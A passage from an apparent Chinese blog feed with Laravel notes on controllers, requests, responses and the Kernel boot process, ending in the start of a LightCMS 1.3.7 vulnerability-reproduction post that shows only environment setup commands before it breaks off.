\Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Remove the specified resource from storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">destroy</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后创建路由</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::resource(<span class="hljs-string">&#x27;post&#x27;</span>,app/Http/Controllers/PostController.php::class);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210705124752719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;task/create&#x27;</span>, <span class="hljs-string">&#x27;TaskController@create&#x27;</span>);<br>Route::post(<span class="hljs-string">&#x27;task&#x27;</span>, <span class="hljs-string">&#x27;TaskController@store&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>我们可以在<code>TaskController.php</code>中创建create方法满足我们的功能</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$task</span> = <span class="hljs-keyword">new</span> Task();<br>    <span class="hljs-variable">$task</span>-&gt;title = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;title&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;description = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;description&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;save();<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;task&#x27;</span>);   <span class="hljs-comment">// 重定向到 GET task 路由</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>后面还可以用门面来获取<code>input</code>.</p><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h4 id="访问请求实例"><a href="#访问请求实例" class="headerlink" title="访问请求实例"></a>访问请求实例</h4><p>在控制器中获取当前 HTTP 请求实例，需要在构造函数或方法中对 <code>Illuminate\Http\Request</code> 类进行依赖注入，这样当前请求实例会被<a href="https://laravelacademy.org/post/21965">服务容器</a>自动注入：</p><p><img src="https://img-blog.csdnimg.cn/20210705132809918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="依赖注入-amp-路由参数"><a href="#依赖注入-amp-路由参数" class="headerlink" title="依赖注入 &amp; 路由参数"></a>依赖注入 &amp; 路由参数</h4><p>如果还期望在控制器方法中获取路由参数，只需要将路由参数置于其它依赖之后即可，例如，如果你的路由定义如下：</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> App\Http\Controllers\UserController;<br><br>Route::put(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, [UserController::class, <span class="hljs-string">&#x27;update&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>仍然可以对 <code>Illuminate\Http\Request</code> 进行依赖注入并通过如下方式定义控制器方法来访问路由参数 <code>id</code>：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br></code></pre></div></td></tr></table></figure><p>还可以在路由闭包中注入 <code>Illuminate\Http\Request</code>，在执行闭包函数的时候服务容器会自动注入输入请求：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br>Route::get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>) </span>&#123;<br>    <span class="hljs-comment">//</span><br>&#125;);<br></code></pre></div></td></tr></table></figure><h4 id="获取请求路径"><a href="#获取请求路径" class="headerlink" title="获取请求路径"></a>获取请求路径</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$path</span> = <span class="hljs-variable">$request</span>-&gt;path(); <span class="hljs-comment">//如果请求URL是 http://blog.test/user/1，则 path 方法将会返回 user/1</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;is(<span class="hljs-string">&#x27;user/*&#x27;</span>))&#123;<br>    <span class="hljs-comment">//如果请求URL是 http://blog.test/user/1，该方法会返回 true。</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="获取请求-URL"><a href="#获取请求-URL" class="headerlink" title="获取请求 URL"></a>获取请求 URL</h4><h4 id="获取请求方法"><a href="#获取请求方法" class="headerlink" title="获取请求方法"></a>获取请求方法</h4><h4 id="获取请求输入"><a href="#获取请求输入" class="headerlink" title="获取请求输入"></a>获取请求输入</h4><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>上述在文档中都比较简单易懂直接看即可</p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>这块主要就是<strong>Response 对象</strong>，其他没有什么特别的</p><p>返回一个完整的 <code>Response</code> 实例允许你自定义响应的 HTTP 状态码和头信息。<code>Response</code> 实例继承自 <code>Symfony\Component\HttpFoundation\Response</code> 基类，该类提供了一系列方法用于创建 HTTP 响应：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;cookie/response&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> response(<span class="hljs-string">&#x27;Hello World&#x27;</span>, <span class="hljs-number">200</span>)<br>        -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>); <span class="hljs-comment">//添加响应头</span><br>&#125;);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)<span class="hljs-comment">//使用 withHeaders 方法来指定头信息数组添加到响应：</span><br>    -&gt;withHeaders([<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-variable">$type</span>,<br>        <span class="hljs-string">&#x27;X-Header-One&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Header-Two&#x27;</span> =&gt; <span class="hljs-string">&#x27;Header Value&#x27;</span>,<br>    ]);<br><br><span class="hljs-keyword">return</span> response(<span class="hljs-variable">$content</span>)              <span class="hljs-comment">//添加 Cookie 到响应</span><br>    -&gt;header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-variable">$type</span>)<br>    -&gt;cookie(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-variable">$minutes</span>);<br><br>  利用辅助函数redirect重定向<br>Route::get(<span class="hljs-string">&#x27;dashboard&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;home/dashboard&#x27;</span>);<br>&#125;);<br><br>还有一些响应，视图响应，文件响应等<br>    <br></code></pre></div></td></tr></table></figure><h2 id="关于视图"><a href="#关于视图" class="headerlink" title="关于视图"></a>关于视图</h2><p>这个比较没什么特别的东西，跳过。</p><h2 id="关于核心类Kernel类"><a href="#关于核心类Kernel类" class="headerlink" title="关于核心类Kernel类"></a>关于核心类Kernel类</h2><p>vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php<br>是laravel处理网络请求的最核心类，在app容器准备好了之后，就会调用本类，之后所有的处理都在此类中。</p><p>具体参考：<a href="https://www.136.la/php/show-9877.html">https://www.136.la/php/show-9877.html</a></p><p>​                    <a href="https://www.136.la/php/show-6124.html">https://www.136.la/php/show-6124.html</a></p><p>​                    <a href="https://www.136.la/php/show-16856.html">https://www.136.la/php/show-16856.html</a></p><p>​                    <a href="https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/w13707470416/article/details/84979186?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm=1001.2101.3001.4242</a></p><p>​                    <a href="https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_33916256/article/details/89063048?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p><div class="hljs code-wrapper"><pre><code>            https://blog.csdn.net/imbibi/article/details/78542258?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-4&amp;spm=1001.2101.3001.4242</code></pre></div><h2 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">index.php<br>bootstrap/autoload.php      --&gt; 自动加载<br>bootstrap/app.php           --&gt; 初始化服务容器(注册基础的服务提供者(事件、日志、路由)、注册核心类别名)<br>bootstrap/app.php           --&gt; 注册共享的Kernel和异常处理器<br>Foundation\\Http\\Kernel.php  --&gt; 处理请求和响应<br>index.php                   --&gt; 将响应信息发送到浏览器<br>index.php                   --&gt; 处理继承自TerminableMiddleware接口的中间件（Session）并结束应用生命周期<br><br>其中处理请求和响应包括：<br>    解析Illuminate\\Contracts\\Http\\Kernel，实例化App\\Http\\Kernel<br>    a. 实例化Kernel ： 构造函数：设置<span class="hljs-variable">$app</span>/<span class="hljs-variable">$router</span>，初始化<span class="hljs-variable">$router</span>中middleware数值<br>    b. handle处理请求：<br>        加载路由中间件、加载环境变量、加载配置文件、加载异常处理机制、注册门面、注册服务提供者、启动服务提供者、管道模式注入中间件<br>    c.将响应信息发送到浏览器<br>        注册request实例到容器 (<span class="hljs-variable">$app</span>[\<span class="hljs-string">&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $request是经过Symfony封装的请求对象</span><br><span class="hljs-string">        清空之前容器中的request实例</span><br><span class="hljs-string">        调用bootstrap方法，启动一系列启动类的bootstrap方法：</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\DetectEnvironment  环境配置（$app[‘env’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\LoadConfiguration  基本配置（$app[‘config’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\ConfigureLogging   日志文件（$app[‘log’]）</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\HandleExceptions   错误&amp;异常处理</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterFacades    清除已解析的Facade并重新启动，注册config文件中alias定义的所有Facade类到容器</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\RegisterProviders  注册config中providers定义的所有Providers类到容器</span><br><span class="hljs-string">        Illuminate\\Foundation\\Bootstrap\\BootProviders      调用所有已注册Providers的boot方法</span><br><span class="hljs-string">        通过Pipeline发送请求，经过中间件，再由路由转发，最终返回响应</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1.自动加载</span><br><span class="hljs-string">    包括全局函数的加载、顶级命名空间映射、PSR0、PSR4标准的实现</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.初始化服务容器</span><br><span class="hljs-string">    注册容器本身</span><br><span class="hljs-string">        将基本的绑定注册到容器中，包括容器自身、容器实例名称app</span><br><span class="hljs-string">        实例化</span><br><span class="hljs-string">            app, Illuminate\\Container\\Container</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function registerBaseBindings() &#123;</span><br><span class="hljs-string">                static::setInstance($this);</span><br><span class="hljs-string">                $this-&gt;instance(\&#x27;app\&#x27;, $this);</span><br><span class="hljs-string">                $this-&gt;instance(Container::class, $this);</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    注册基础服务提供者</span><br><span class="hljs-string">        向容器分别注册了Key为以下值得实例</span><br><span class="hljs-string">            events</span><br><span class="hljs-string">            log</span><br><span class="hljs-string">            router、url、redirect、Illuminate\\Contracts\\Routing\\ResponseFactory</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function registerBaseServiceProviders() &#123;</span><br><span class="hljs-string">                $this-&gt;register(new EventServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new LogServiceProvider($this));</span><br><span class="hljs-string">                $this-&gt;register(new RoutingServiceProvider($this));</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">    注册容器别名(注册共享的Kernel)</span><br><span class="hljs-string">        在调用此方法之前，我们想取得一个容器实例的做法是 App::make(\&#x27;app\&#x27;);</span><br><span class="hljs-string">        现在我们可以使用三种方法来取得一个容器实例app</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Container\\Container\&#x27;)</span><br><span class="hljs-string">                    App::make(\&#x27;Illuminate\\Contracts\\Foundation\\Application\&#x27;)</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            public function registerCoreContainerAliases()&#123;</span><br><span class="hljs-string">                ...</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">3. 注册共享的Kernel和异常处理器</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Http\\Kernel::class,</span><br><span class="hljs-string">                App\\Http\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Console\\Kernel::class,</span><br><span class="hljs-string">                App\\Console\\Kernel::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">            $app-&gt;singleton(</span><br><span class="hljs-string">                Illuminate\\Contracts\\Debug\\ExceptionHandler::class,</span><br><span class="hljs-string">                App\\Exceptions\\Handler::class</span><br><span class="hljs-string">            );</span><br><span class="hljs-string"></span><br><span class="hljs-string">4. 处理请求和响应</span><br><span class="hljs-string">        实例化App\\Http\\Kernel</span><br><span class="hljs-string">        构造函数：设置$app/$router，初始化$router中middleware数值</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">                public function __construct(Application $app, Router $router)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    $this-&gt;app = $app;</span><br><span class="hljs-string">                    $this-&gt;router = $router;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    $router-&gt;middlewarePriority = $this-&gt;middlewarePriority;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;middlewareGroups as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;middlewareGroup($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                    foreach ($this-&gt;routeMiddleware as $key =&gt; $middleware) &#123;</span><br><span class="hljs-string">                        $router-&gt;aliasMiddleware($key, $middleware);</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">5. handle处理请求</span><br><span class="hljs-string">        a. 注册request实例到容器 ($app[\&#x27;request\&#x27;]-&gt;Illuminate\\Http\\Request)  --  $request是经过Symfony封装的请求对象</span><br><span class="hljs-string">        b. 清空之前容器中的request实例</span><br><span class="hljs-string">        c. 调用bootstrap方法，启动一系列启动类的bootstrap方法</span><br><span class="hljs-string">        d. 通过Pipeline发送请求，经过中间件，再由路由转发，最终返回响应</span><br><span class="hljs-string"></span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected function sendRequestThroughRouter($request)</span><br><span class="hljs-string">            &#123;</span><br><span class="hljs-string">                $this-&gt;app-&gt;instance(\&#x27;request\&#x27;, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                Facade::clearResolvedInstance(\&#x27;request\&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">                $this-&gt;bootstrap();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                return (new Pipeline($this-&gt;app))</span><br><span class="hljs-string">                            -&gt;send($request)</span><br><span class="hljs-string">                            -&gt;through($this-&gt;app-&gt;shouldSkipMiddleware() ? [] : $this-&gt;middleware)</span><br><span class="hljs-string">                            -&gt;then($this-&gt;dispatchToRouter());</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">6. bootstrap方法</span><br><span class="hljs-string">        a.检测环境变量文件是否正常</span><br><span class="hljs-string">        b.取得配置文件，即把/config/下的所有配置文件读取到容器（app()-&gt;make(\&#x27;config\&#x27;)可以查看所有配置信息）</span><br><span class="hljs-string">        c.注册异常： set_error_handler,set_exception_handler, register_shutdown_function</span><br><span class="hljs-string">        d.把/config/app.php里面的aliases项利用PHP库函数class_alias创建别名，从此，我们可以使用App::make(\&#x27;app\&#x27;)方式取得实例</span><br><span class="hljs-string">        e.把/config/app.php里面的providers项,注册到容器</span><br><span class="hljs-string">        f.运行容器中注册的所有的ServiceProvider中得boot方法</span><br><span class="hljs-string"></span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            protected $bootstrappers = [</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadEnvironmentVariables::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\LoadConfiguration::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\HandleExceptions::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterFacades::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\RegisterProviders::class,</span><br><span class="hljs-string">                \\Illuminate\\Foundation\\Bootstrap\\BootProviders::class,</span><br><span class="hljs-string">            ];</span><br><span class="hljs-string"></span><br><span class="hljs-string">7. 将响应信息发送到浏览器</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $response-&gt;send();</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">9. 处理继承自TerminableMiddleware</span><br><span class="hljs-string">        关键代码：</span><br><span class="hljs-string">            $kernel-&gt;terminate($request, $response);</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">10. Laravel路由</span><br><span class="hljs-string">    $this-&gt;dispatchToRouter()</span><br><span class="hljs-string">    --&gt; $this-&gt;router-&gt;dispatch($request)</span><br><span class="hljs-string">    --&gt; $this-&gt;dispatchToRoute($request);  -- /Illuminate/Routing/Router.php</span><br><span class="hljs-string">    --&gt; $response = $this-&gt;runRouteWithinStack($route, $request);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    //干货来了</span><br><span class="hljs-string">    protected function runRouteWithinStack(Route $route, Request $request)</span><br><span class="hljs-string">    &#123;</span><br><span class="hljs-string">        // 取得routes.php里面的Middleware节点</span><br><span class="hljs-string">        $middleware = $this-&gt;gatherRouteMiddlewares($route);</span><br><span class="hljs-string">        //这个有点眼熟</span><br><span class="hljs-string">        return (new Pipeline($this-&gt;container))</span><br><span class="hljs-string">                -&gt;send($request)</span><br><span class="hljs-string">                -&gt;through($middleware)    //执行上述的中间件</span><br><span class="hljs-string">                -&gt;then(function($request) use ($route)</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    //不容易啊，终于到Controller类了</span><br><span class="hljs-string">                    return $this-&gt;prepareResponse(</span><br><span class="hljs-string">                        $request,</span><br><span class="hljs-string">                        $route-&gt;run($request); //run控制器</span><br><span class="hljs-string">                    );</span><br><span class="hljs-string">                &#125;);</span><br><span class="hljs-string">    &#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LightCMS1.3.7漏洞复现</title>
    <link href="/2021/07/02/2021-7-2-LightCMS1.3.7/"/>
    <url>/2021/07/02/2021-7-2-LightCMS1.3.7/</url>
    
    <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p><code>lightCMS</code>是一个轻量级的<code>CMS</code>系统，也可以作为一个通用的后台管理框架使用。<code>lightCMS</code>集成了用户管理、权限管理、日志管理、菜单管理等后台管理框架的通用功能，同时也提供模型管理、分类管理等<code>CMS</code>系统中常用的功能。</p><h5 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h5><figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/www/html<br>git clone https://hub.fastgit.org/eddy8/LightCMS.git<br><span class="hljs-built_in">cd</span> lightCMS<br>composer install<br>sudo chmod <span class="hljs-number">777</span> -R storage/ bootstrap/cache/<br>cp .env.example .env<br><br>数据库配置：<br>CREATE DATABASE homestead;<br>CREATE USER &#x27;homestead&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;secret&#x27;;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;homestead&#x27;@&#x27;localhost&#x27;;<br>FLUSH PRIVILEGES;<br><br>php artisan migrate --seed<br>php artisan serve <br><br>途中可能回遇到一些php-mysql依赖没有安装，<br>sudo apt-get install php7.<span class="hljs-number">4</span>-xsl php7.<span class="hljs-number">4</span>-mbstring php7.<span class="hljs-number">4</span>-intl -y php7.<span 